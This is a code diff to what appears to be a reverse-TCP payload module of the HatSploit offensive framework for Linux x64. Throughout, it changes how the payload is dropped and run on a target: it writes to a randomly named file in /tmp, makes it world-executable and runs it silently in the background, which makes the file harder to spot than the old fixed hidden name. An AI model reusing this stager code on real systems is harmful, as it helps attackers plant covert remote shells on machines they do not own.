@@ -28,11 +28,12 @@ import base64
 
 from core.base.config import Config
 from core.lib.payload import Payload
-from data.payloads.linux.x64.membrane_reverse_tcp.core.session import session
+from data.payloads.linux.x64.membrane_reverse_tcp.core.session import HatSploitSession
 from utils.tcp.tcp import TCPClient
+from utils.string.string import StringTools
 
 
-class HatSploitPayload(Payload, TCPClient):
+class HatSploitPayload(Payload, TCPClient, StringTools):
     config = Config()
 
     details = {
@@ -86,12 +87,14 @@ class HatSploitPayload(Payload, TCPClient):
             self.output_error("Failed to generate payload!")
             return
 
+        filename = self.random_string()
+
         instructions = ""
-        instructions += "cat >/tmp/.payload;"
-        instructions += "chmod 777 /tmp/.payload;"
-        instructions += f"sh -c '/tmp/.payload {remote_data}' 2>/dev/null &"
+        instructions += f"cat >/tmp/{filename};"
+        instructions += f"chmod 777 /tmp/{filename};"
+        instructions += f"sh -c '/tmp/{filename} {remote_data}' 2>/dev/null &"
         instructions += "\n"
 
         self.payload = payload
         self.instructions = instructions
-        self.session = session
+        self.session = HatSploitSession
